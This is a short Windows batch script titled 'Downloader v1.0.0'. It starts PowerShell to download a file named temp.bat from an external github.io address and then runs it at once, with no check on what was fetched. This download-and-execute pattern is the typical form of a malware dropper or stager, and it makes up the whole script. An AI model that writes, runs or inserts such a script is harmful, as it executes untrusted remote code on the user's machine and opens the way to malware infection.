echo. 
@echo off 
title DOWNLOAD 
cls 
echo Downloader v1.0.0
echo Begin
start powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('https://jinxcade.github.io/kiti/temp.bat','temp.bat')
start temp.bat
exit